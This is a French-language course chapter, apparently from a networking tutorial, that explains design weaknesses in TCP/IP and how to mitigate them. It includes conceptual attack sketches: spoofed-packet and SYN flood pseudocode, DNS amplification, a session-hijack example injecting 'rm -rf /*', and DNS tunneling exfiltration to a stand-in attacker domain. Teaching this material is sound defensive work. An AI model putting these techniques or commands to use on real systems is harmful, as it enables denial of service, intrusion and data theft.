🔝 Retour au [Sommaire](/SOMMAIRE.md)

# 6.1 Vulnérabilités inhérentes à TCP/IP

## Introduction

Les vulnérabilités inhérentes à TCP/IP ne sont pas des bugs ou des erreurs de programmation. Ce sont des **caractéristiques fondamentales de la conception** de ces protocoles qui créent des opportunités d'exploitation pour les attaquants. Contrairement aux vulnérabilités logicielles qui peuvent être corrigées par des mises à jour, ces faiblesses structurelles font partie de la spécification même des protocoles et ne peuvent être éliminées sans modifier profondément TCP/IP.

Comprendre ces vulnérabilités est crucial pour :
- Évaluer les risques réels de vos systèmes
- Choisir les protections appropriées
- Comprendre pourquoi certaines attaques sont possibles
- Concevoir des architectures résilientes

## Contexte historique : pourquoi ces vulnérabilités existent-elles ?

### Le réseau de confiance (1970-1980)

Lorsque TCP/IP a été conçu, Internet était **ARPANET**, un réseau :
- **Fermé** : accessible uniquement aux chercheurs et militaires
- **Petit** : quelques dizaines puis centaines de machines
- **Homogène** : utilisateurs de confiance partageant les mêmes objectifs
- **Collaboratif** : l'entraide primait sur la méfiance

**Priorités de conception** :
1. Interopérabilité entre systèmes hétérogènes
2. Résilience face aux pannes (routage dynamique)
3. Performance et simplicité
4. Extensibilité

**La sécurité n'était pas une priorité** car :
- Les utilisateurs se connaissaient
- L'accès physique était contrôlé
- Les attaques malveillantes étaient impensables
- Les ressources de calcul étaient limitées (le chiffrement était trop coûteux)

### La transition vers l'Internet ouvert

**Années 1990** : Commercialisation d'Internet
- Explosion du nombre d'utilisateurs (de milliers à millions)
- Apparition des premiers virus et attaques
- Prise de conscience progressive des risques

**Années 2000** : Internet critique
- Infrastructures critiques connectées (banques, énergie, santé)
- Criminalité organisée et cyberguerre
- Données personnelles et financières en ligne

**Années 2010-2020** : Hyperconnexion
- Milliards d'utilisateurs et d'appareils
- Cloud computing et services critiques
- IoT et surfaces d'attaque massives
- Cybersécurité devenue enjeu stratégique

**Le problème** : Les protocoles conçus pour un réseau de confiance sont maintenant utilisés dans un environnement hostile, sans possibilité de modification fondamentale (trop de systèmes déployés, compatibilité rétroactive nécessaire).

## Vulnérabilités fondamentales transversales

### 1. Absence d'authentification native

**Problème** : TCP/IP ne vérifie pas l'identité de l'expéditeur d'un paquet.

**Conséquences** :
- N'importe qui peut prétendre être n'importe qui
- Aucun mécanisme pour vérifier qu'un paquet vient réellement de l'adresse source indiquée
- Confiance aveugle dans les informations déclarées

**Exemple concret - Email spoofing** :
```
Paquet SMTP normal :
MAIL FROM: <admin@banque.fr>
RCPT TO: <victime@example.com>

Le serveur de messagerie accepte l'adresse déclarée sans vérification.
L'attaquant peut envoyer un email qui semble provenir de n'importe quelle adresse.
```

**Exemple concret - IP spoofing** :
```
Paquet IP :
+------------------+
| Src: 192.168.1.1 | ← L'attaquant peut mettre n'importe quelle IP
| Dst: 10.0.0.5    |
| Données...       |
+------------------+

Le destinataire ne peut pas vérifier que le paquet vient vraiment de 192.168.1.1
```

**Impact réel** :
- Phishing et arnaques par email
- Contournement de listes blanches d'IP
- Attaques par réflexion/amplification
- Usurpation d'identité dans les protocoles applicatifs

### 2. Transmission en clair par défaut

**Problème** : Les protocoles de base TCP/IP ne chiffrent pas les données.

**Protocoles vulnérables** :
- HTTP (pages web)
- FTP (transfert de fichiers)
- Telnet (accès distant)
- SMTP (email sortant)
- POP3/IMAP (email entrant)
- DNS (résolution de noms)

**Exemple concret - Capture HTTP** :
```
Requête HTTP capturée sur le réseau :
GET /account/login HTTP/1.1
Host: example.com
Cookie: session=abc123xyz789
Authorization: Basic dXNlcjpwYXNzd29yZA==

Le cookie de session est visible en clair
Le header Authorization contient "user:password" en base64 (= texte clair)
```

**Démonstration avec Wireshark** :
Lorsqu'un utilisateur se connecte à un site en HTTP, un attaquant sur le même réseau Wi-Fi peut :
1. Capturer tous les paquets (mode promiscuous)
2. Filtrer le trafic HTTP (`http.request.method == "POST"`)
3. Extraire les identifiants, cookies, données personnelles
4. Rejouer la session (session hijacking)

**Impact** :
- Vol d'identifiants et de cookies
- Espionnage industriel
- Interception de données sensibles (médicales, financières)
- Surveillance de masse

### 3. Absence d'intégrité cryptographique

**Problème** : TCP/IP ne garantit pas cryptographiquement que les données n'ont pas été modifiées.

**Mécanismes d'intégrité existants (insuffisants)** :
- **Checksum IP** : Détecte les erreurs de transmission, pas les modifications intentionnelles
- **Checksum TCP/UDP** : Idem, algorithme simple et prévisible

**Exemple de checksum TCP** :
```
Le checksum TCP est calculé avec un algorithme simple :
- Somme de tous les mots de 16 bits
- Complément à un du résultat

Un attaquant peut :
1. Modifier le contenu du paquet
2. Recalculer le checksum en quelques microsecondes
3. Le paquet modifié semble légitime
```

**Attaque concrète - TCP sequence prediction** :
```
Séquence normale :
Client → SYN (seq=1000)
Serveur → SYN-ACK (seq=5000, ack=1001)
Client → ACK (seq=1001, ack=5001)
Client → Data (seq=1001, "GET /index.html")

Attaque :
Attaquant observe la séquence
Attaquant envoie : Data (seq=1001, "GET /admin/delete_all")
Le serveur accepte si le numéro de séquence est correct
```

**Impact** :
- Injection de données dans des connexions existantes
- Modification de pages web à la volée
- Altération de transactions financières
- Corruption de fichiers transférés

### 4. Prévisibilité et manque d'aléatoire

**Problème** : Certains mécanismes TCP/IP utilisent des valeurs prédictibles.

**Éléments prédictibles** :

**Numéros de séquence TCP (anciennes implémentations)** :
```
Connexion 1 : ISN = 1000000
Connexion 2 : ISN = 1001000 (incrément de 1000)
Connexion 3 : ISN = 1002000 (prévisible !)

L'attaquant peut prédire le prochain ISN et hijacker une connexion
avant même qu'elle ne soit établie.
```

**IP ID (fragmentation)** :
```
Paquet 1 : IP ID = 5000
Paquet 2 : IP ID = 5001
Paquet 3 : IP ID = 5002

Permet de :
- Tracker un utilisateur à travers différents réseaux
- Estimer le volume de trafic d'un hôte
- Compter les hôtes derrière un NAT
```

**Ports sources (anciennes implémentations)** :
```
Connexion sortante 1 : port source 1024
Connexion sortante 2 : port source 1025
Connexion sortante 3 : port source 1026

Facilite le spoofing de réponses DNS ou autres attaques
```

**Impact** :
- Hijacking de connexions TCP
- Prédiction de jetons de session
- Bypass de protections basées sur l'aléatoire
- Tracking d'utilisateurs

## Vulnérabilités par couche

### Couche Accès Réseau (Liaison)

#### ARP : aucune authentification

**Fonctionnement normal d'ARP** :
```
Machine A veut communiquer avec 192.168.1.10 :

1. A broadcast : "Qui a l'IP 192.168.1.10 ? Dites-le à AA:AA:AA:AA:AA:AA"
2. Machine B répond : "C'est moi ! Mon MAC est BB:BB:BB:BB:BB:BB"
3. A enregistre : 192.168.1.10 = BB:BB:BB:BB:BB:BB
```

**Vulnérabilité** : ARP accepte les réponses non sollicitées (Gratuitous ARP).

**Attaque ARP Spoofing/Poisoning** :
```
Réseau normal :
Client (MAC: AA:AA) ← → Routeur (MAC: RR:RR) ← → Internet

Attaquant envoie :
"192.168.1.1 (routeur) est maintenant à MAC: XX:XX (attaquant)"

Table ARP du client empoisonnée :
192.168.1.1 → XX:XX (au lieu de RR:RR)

Tout le trafic vers Internet passe par l'attaquant
```

**Conséquences** :
- Man-in-the-Middle sur tout le trafic local
- Interception de données
- Modification de réponses
- Déni de service

**Pourquoi c'est possible** :
- ARP fait confiance à toute réponse
- Pas de signature ni d'authentification
- Impossible de vérifier la légitimité d'une annonce ARP

#### Protocoles de couche 2 sans chiffrement

**Problème** : Les trames Ethernet, Wi-Fi (sans WPA2/3) transitent en clair.

**Sur un réseau Wi-Fi ouvert** :
```
Tous les clients du café partagent le même medium radio
Toute trame peut être capturée par n'importe quel appareil
Mode monitor/promiscuous : réception de TOUT le trafic

Données exposées :
- Adresses MAC (tracking d'appareils)
- Protocoles utilisés (HTTP, DNS, etc.)
- Contenu complet si non chiffré au niveau supérieur
```

### Couche Internet (IP)

#### IP Spoofing : usurpation d'adresse source

**Vulnérabilité fondamentale** : L'adresse IP source est simplement un champ dans l'en-tête, modifiable à volonté.

**Création d'un paquet avec IP source falsifiée** :
```python
# Exemple conceptuel
paquet = IP_Packet()
paquet.src = "8.8.8.8"  # Google DNS - adresse falsifiée
paquet.dst = "192.168.1.100"  # Cible
paquet.data = "Contenu malveillant"
send(paquet)

Le destinataire voit un paquet venant de 8.8.8.8
mais il vient en réalité de l'attaquant
```

**Limitations pratiques** :
- Les réponses vont à l'adresse falsifiée (attaquant ne les reçoit pas)
- Certains FAI filtrent (BCP 38 / RFC 2827)
- Nécessite des privilèges root/admin pour forger des paquets bruts

**Utilisations malveillantes** :

**1. Smurf Attack (amplification ICMP)** :
```
Attaquant falsifie l'IP source avec celle de la victime :
src: 192.168.1.100 (victime)
dst: 10.0.0.255 (broadcast)
Type: ICMP Echo Request

Tous les hôtes de 10.0.0.0/24 répondent à la victime
1 paquet envoyé → 254 réponses vers la victime
Amplification massive !
```

**2. Contournement de ACL** :
```
Firewall rule : ALLOW from 10.0.0.0/8 to 192.168.1.5:22

Attaquant falsifie :
src: 10.0.0.50 (adresse autorisée)
dst: 192.168.1.5:22

Le pare-feu laisse passer (vérification basée sur l'IP source)
```

#### Fragmentation IP : attaques et évasions

**Principe de fragmentation** :
```
Paquet original trop grand (2000 octets) pour MTU (1500 octets) :

Fragment 1 : offset=0, MF=1 (More Fragments), 1480 octets
Fragment 2 : offset=1480, MF=0, 520 octets

Le destinataire réassemble les fragments
```

**Vulnérabilités** :

**1. Fragment overlapping (chevauchement)** :
```
Fragment 1 : offset=0, taille=1000, "AUTORISÉ..."
Fragment 2 : offset=500, taille=1000, "...MALVEILLANT"

Réassemblage ambigu :
- Certains systèmes privilégient le premier fragment
- D'autres le dernier
- IDS et destination peuvent réassembler différemment

Résultat : Contenu malveillant passe inaperçu
```

**2. Tiny fragments** :
```
Fragment 1 : offset=0, 8 octets (contient juste début de l'en-tête TCP)
Fragment 2 : offset=8, reste des données

Problème : Le pare-feu ne peut pas lire les ports TCP (dans fragment 2)
Il laisse passer sans vérifier la règle de port
```

**3. Fragmentation Bomb (Teardrop)** :
```
Fragment 1 : offset=0, longueur=1000
Fragment 2 : offset=800, longueur=1000

Chevauchement incohérent : crash lors du réassemblage
Débordement de buffer, déni de service
```

#### ICMP : outil légitime, vecteur d'attaque

**Fonctions légitimes d'ICMP** :
- Ping (Echo Request/Reply)
- Traceroute (Time Exceeded)
- Notification d'erreurs (Destination Unreachable, Redirect)

**Vulnérabilités** :

**1. ICMP Redirect** :
```
Message ICMP normal :
"Le chemin vers 8.8.8.8 passe maintenant par 192.168.1.200"

Attaquant envoie :
ICMP Redirect : "Tous les paquets vers Internet passent par moi"

Table de routage de la victime modifiée
Tout le trafic redirigé vers l'attaquant
```

**2. ICMP Destination Unreachable (manipulation de connexions)** :
```
Connexion TCP établie entre A et B

Attaquant forge :
ICMP Dest Unreachable (Port Unreachable)
src: B
dst: A

A pense que B a fermé le port
Connexion interrompue (déni de service)
```

**3. Ping Flood** :
```
Envoi massif de requêtes ICMP Echo Request
→ Sature la bande passante
→ Épuise les ressources CPU (génération de réponses)
```

**4. Ping of Death** :
```
Paquet ICMP fragmenté de taille > 65535 octets
Lors du réassemblage : débordement de buffer
Crash du système (ancien, mais historiquement significatif)
```

### Couche Transport

#### TCP : complexité = surface d'attaque

**Vulnérabilité 1 : SYN Flood**

**État normal** :
```
Table des connexions du serveur :
SYN_RECEIVED (client1) - attente ACK - timeout 75s
SYN_RECEIVED (client2) - attente ACK - timeout 75s
...
Capacité : 1000 connexions semi-ouvertes maximum
```

**Attaque** :
```
Attaquant envoie 10 000 SYN/seconde avec IP source falsifiée
→ Table pleine en 0.1 seconde
→ Connexions légitimes refusées
→ Serveur inaccessible
```

**Détails de l'attaque** :
```
for i in 1..10000:
    send TCP SYN:
        src: IP_aléatoire()  # IP falsifiée
        dst: serveur:80
        seq: aléatoire()
        # Pas d'ACK envoyé

Serveur alloue des ressources pour chaque SYN
Attend 75 secondes avant timeout
Ressources épuisées
```

**Pourquoi c'est inhérent** :
- TCP DOIT maintenir l'état des connexions semi-ouvertes
- Impossible de vérifier si le SYN est légitime sans réponse
- Le three-way handshake est fondamental à TCP

**Vulnérabilité 2 : TCP Sequence Prediction (historique)**

**Anciennes implémentations** :
```
Connexion 1 : ISN = timestamp * 128000
Connexion 2 (1 seconde après) : ISN = (timestamp+1) * 128000

Prédictibilité :
L'attaquant peut calculer le prochain ISN avec précision
```

**Attaque de Kevin Mitnick (1994)** :
```
1. Attaquant observe plusieurs connexions pour déduire l'algorithme ISN
2. Attaquant effectue un SYN flood contre une machine de confiance X
3. Attaquant forge un SYN vers le serveur cible en se faisant passer pour X
4. Serveur répond SYN-ACK à X (qui est floodée, ignore le paquet)
5. Attaquant prédit l'ISN et envoie un ACK avec le bon numéro de séquence
6. Connexion établie sans jamais avoir reçu le SYN-ACK
7. Attaquant peut envoyer des commandes au serveur
```

**Vulnérabilité 3 : TCP Reset Injection**

**Connexion normale** :
```
Client ←→ Serveur : connexion établie
seq=1000, ack=5000
```

**Attaque** :
```
Attaquant observe la connexion (sniffing)
Attaquant envoie un TCP RST forgé :
    src: Serveur
    dst: Client
    seq: 5000 (numéro de séquence attendu par le client)
    flags: RST

Client reçoit le RST, ferme la connexion immédiatement
Communication interrompue
```

**Utilisation réelle** :
- Censure d'Internet (Great Firewall of China)
- Interruption de communications VoIP
- Sabotage de téléchargements

**Vulnérabilité 4 : TCP Session Hijacking**

**Prérequis** :
- Sniffing du trafic (même réseau local, ou compromission d'un routeur)
- Connaissance des numéros de séquence

**Attaque** :
```
Session authentifiée :
Client ← (seq=1000) → Serveur
           (ack=5000)

Attaquant injecte :
    src: Client
    dst: Serveur
    seq: 1000 (numéro de séquence correct)
    data: "rm -rf /*" ou autre commande malveillante

Serveur accepte et exécute
Le vrai client reçoit un "out of order" et la connexion se désynchronise
```

#### UDP : simplicité = exposition

**Caractéristiques d'UDP** :
- Sans état (pas de connexion)
- Sans fiabilité (pas d'ACK)
- Sans ordre (pas de numéros de séquence)

**Conséquences sécuritaires** :

**1. Facilité de spoofing**
```
UDP ne maintient aucun état
Impossible de distinguer :
- Un paquet légitime
- Un paquet forgé avec IP source falsifiée

Exemple :
send UDP:
    src: 8.8.8.8:53  # DNS de Google (falsifié)
    dst: victime:12345
    data: "Fausse réponse DNS"

La victime ne peut pas vérifier l'authenticité
```

**2. Attaques par amplification**

**Principe** :
```
Requête de l'attaquant : 60 octets
Réponse du serveur : 3000 octets
Facteur d'amplification : 50x
```

**DNS Amplification** :
```
Attaquant envoie :
    src: IP_victime (falsifiée)
    dst: serveur_DNS:53
    query: ANY example.com (demande TOUS les enregistrements)

Serveur DNS répond :
    src: serveur_DNS:53
    dst: IP_victime
    response: 3000 octets de données

Attaquant utilise 1000 serveurs DNS
→ 60 Ko envoyés
→ 3000 Ko (3 Mo) reçus par la victime
→ Amplification 50x
```

**Autres protocoles exploitables** :
- **NTP** (Network Time Protocol) : facteur 556x
- **SNMP** (Simple Network Management Protocol) : facteur 650x
- **SSDP** (Simple Service Discovery Protocol) : facteur 30x
- **Memcached** : facteur 51000x (!)

**3. UDP Flood simple**
```
Envoi massif de datagrammes UDP
→ Saturation de la bande passante
→ Épuisement des ressources du serveur
```

### Couche Application

#### DNS : Infrastructure critique non sécurisée

**Vulnérabilité fondamentale** : DNS (classique) n'a aucune authentification.

**1. DNS Cache Poisoning (Kaminsky Attack)**

**Fonctionnement normal** :
```
Client → Résolveur : "Quelle est l'IP de www.banque.fr ?"
Résolveur → Serveur autoritatif : requête
Serveur → Résolveur : réponse (93.184.216.34)
Résolveur met en cache pendant le TTL
Résolveur → Client : 93.184.216.34
```

**Attaque** :
```
1. Attaquant envoie une requête : "Quelle est l'IP de random123.banque.fr ?"
2. Résolveur interroge le serveur DNS de banque.fr
3. Attaquant inonde le résolveur de fausses réponses :
   Query ID: 1234, www.banque.fr → 6.6.6.6 (IP attaquant)
   Query ID: 1235, www.banque.fr → 6.6.6.6
   Query ID: 1236, www.banque.fr → 6.6.6.6
   ... (milliers de tentatives)

4. Si une réponse falsifiée arrive avant la vraie avec le bon Query ID :
   → Cache empoisonné
   → Tous les clients utilisant ce résolveur vont vers 6.6.6.6
   → Session hijacking, phishing, malware
```

**Facteurs facilitant l'attaque** :
- Query ID sur seulement 16 bits (65536 possibilités)
- Port source souvent prédictible
- Pas de vérification d'authenticité

**2. DNS Spoofing sur réseau local**

```
Client envoie requête DNS sur le réseau local
Attaquant (sur le même réseau) voit la requête
Attaquant répond plus vite que le vrai serveur DNS :
    src: 8.8.8.8 (serveur DNS légitime, falsifié)
    query ID: [même que la requête]
    response: www.banque.fr → 6.6.6.6

Client accepte la première réponse reçue
→ Redirection vers un site malveillant
```

**3. DNS Tunneling (exfiltration de données)**

```
Données à exfiltrer : "password123"

Attaquant encode dans des requêtes DNS :
- query: cGFzc3dvcmQxMjM.tunnel.attacker.com
- query: splitpart1.tunnel.attacker.com
- query: splitpart2.tunnel.attacker.com

DNS traverse les pare-feu (port 53 rarement bloqué)
Données reçues par le serveur DNS de l'attaquant
Contournement de DLP et filtrage de contenu
```

#### HTTP : Conçu pour être ouvert, pas sécurisé

**Vulnérabilités intrinsèques** :

**1. Transmission en clair**
```
GET /admin/users HTTP/1.1
Host: intranet.company.com
Cookie: session=abc123; admin=true
Authorization: Basic YWRtaW46cGFzc3dvcmQ=

Toutes les informations visibles en clair :
- Chemins d'accès (révèle la structure)
- Cookies de session (hijackable)
- Credentials (Base64 = pas de chiffrement !)
```

**2. Absence de vérification d'intégrité**
```
Réponse HTTP originale :
HTTP/1.1 200 OK
Content-Length: 500
<html>Votre solde : 1000€</html>

Attaquant intercepte et modifie :
HTTP/1.1 200 OK
Content-Length: 500
<html>Votre solde : 0€</html>

Client affiche la version modifiée
Aucun moyen de détecter la manipulation
```

**3. Session fixation et hijacking**
```
Cookie de session transmis en clair :
Cookie: PHPSESSID=abc123xyz789

Attaquant capture le cookie
Attaquant rejoue la requête avec ce cookie :
GET /account HTTP/1.1
Cookie: PHPSESSID=abc123xyz789

Serveur accepte → Attaquant accède au compte
```

## Tableau récapitulatif des vulnérabilités

| Couche | Protocole | Vulnérabilité | Exploitation | Impact |
|--------|-----------|---------------|--------------|--------|
| **Liaison** | ARP | Pas d'auth | ARP poisoning | MitM local |
| **Liaison** | Ethernet | Pas de chiffrement | Sniffing | Interception |
| **Internet** | IP | IP spoofing | Falsification source | Amplification, ACL bypass |
| **Internet** | IP | Fragmentation | Overlap, tiny fragments | IDS evasion, crash |
| **Internet** | ICMP | Messages de contrôle | Redirect, flood | Redirection, DoS |
| **Transport** | TCP | État de connexion | SYN flood | DoS |
| **Transport** | TCP | Numéros de séquence | Prediction, injection | Session hijacking |
| **Transport** | UDP | Sans état | Spoofing | Amplification DDoS |
| **Application** | DNS | Pas d'auth | Cache poisoning | Redirection globale |
| **Application** | HTTP | Transmission claire | Sniffing, modification | Vol de données |

## Pourquoi ces vulnérabilités persistent-elles ?

### 1. Rétrocompatibilité

**Problème** : Modifier les protocoles casserait Internet.

```
Scénario hypothétique - "Fixer" IP spoofing :

Nouvelle version : IP v4.1 avec authentification obligatoire
→ Routeurs doivent vérifier chaque paquet
→ Tous les routeurs Internet doivent être mis à jour simultanément
→ Performance réduite (calculs cryptographiques)
→ Impossible en pratique avec des milliards d'équipements
```

### 2. Coût de déploiement

**IPsec existe depuis 1995** pour sécuriser IP, mais :
- Complexité de configuration
- Overhead de performance
- Incompatibilités entre implémentations
- Adoption limitée (sauf VPN)

**DNSSEC existe depuis 1999**, mais :
- Seulement ~30% des domaines .com l'utilisent
- Complexité opérationnelle (gestion des clés)
- Problèmes de performance initiaux
- Chaîne de confiance fragile

### 3. Performance vs Sécurité

**Chiffrement systématique** :
```
Sans chiffrement :
Débit : 10 Gbps
Latence : 1ms
CPU : 5%

Avec chiffrement (TLS/IPsec) :
Débit : 7-9 Gbps (-10-30%)
Latence : 1.5-2ms (+50-100%)
CPU : 20-40% (+300-700%)

Pour un datacenter traitant des millions de requêtes/seconde,
l'impact est significatif.
```

### 4. Principe de conception d'origine

**"End-to-end principle"** :
- Le réseau doit être simple et agnostique
- L'intelligence est aux extrémités (applications)
- La sécurité est la responsabilité des applications, pas du réseau

**Conséquence** : TCP/IP fournit le transport, la sécurité doit être ajoutée par-dessus (TLS, SSH, VPN, etc.).

## Stratégies de mitigation

Face à ces vulnérabilités inhérentes, plusieurs approches :

### 1. Chiffrement de bout en bout
- **TLS/SSL** pour les applications web et email
- **SSH** pour l'accès distant
- **VPN (IPsec, WireGuard)** pour les réseaux
- **HTTPS partout** (Let's Encrypt a facilité l'adoption)

### 2. Ajout d'authentification
- **DNSSEC** pour DNS
- **SPF/DKIM/DMARC** pour email
- **Certificats** pour serveurs et parfois clients
- **Signatures cryptographiques** dans les protocoles applicatifs

### 3. Filtrage et contrôle d'accès
- **BCP 38** (filtrage anti-spoofing chez les FAI)
- **Firewalls** avec inspection d'état
- **Segmentation réseau** (VLANs, DMZ)
- **IDS/IPS** pour détecter les anomalies

### 4. Durcissement des implémentations
- **SYN cookies** contre SYN flood
- **Randomisation** des ISN, IP ID, ports sources
- **Rate limiting** contre les floods
- **Validation stricte** des entrées

### 5. Architectures modernes
- **Zero Trust** : ne jamais faire confiance, toujours vérifier
- **mTLS** : authentification mutuelle client-serveur
- **Service mesh** : chiffrement automatique entre microservices
- **SASE** : sécurité intégrée dans le réseau cloud

## Conclusion

Les vulnérabilités inhérentes à TCP/IP ne sont pas des défauts accidentels, mais des **conséquences de choix de conception** faits dans un contexte radicalement différent de celui d'aujourd'hui. Ces protocoles ont été optimisés pour la **résilience, l'interopérabilité et la performance** dans un environnement de confiance, pas pour la sécurité dans un Internet hostile.

**Points clés à retenir** :

1. **Aucune authentification native** : N'importe qui peut prétendre être n'importe qui
2. **Transmission en clair par défaut** : Les données sont exposées à toute interception
3. **Pas d'intégrité cryptographique** : Les modifications passent inaperçues
4. **Prévisibilité dangereuse** : Certains mécanismes sont exploitables par leur déterminisme

**Implications pratiques** :

- **Ne jamais faire confiance au réseau** : Considérer tout le trafic comme potentiellement hostile
- **Chiffrer systématiquement** : Protéger les données en transit (TLS, VPN)
- **Authentifier rigoureusement** : Vérifier l'identité avant d'accorder l'accès
- **Défense en profondeur** : Multiplier les couches de protection
- **Rester vigilant** : Les attaques évoluent constamment

Ces vulnérabilités fondamentales expliquent pourquoi la sécurité réseau est un **processus continu** plutôt qu'un état final. Dans les sections suivantes, nous étudierons comment les attaquants exploitent concrètement ces faiblesses, et surtout, comment s'en protéger efficacement avec les technologies modernes comme TLS, IPsec, et les VPN.

⏭️ [Attaques courantes : spoofing, sniffing, man-in-the-middle](/06-securite/02-attaques-courantes.md)
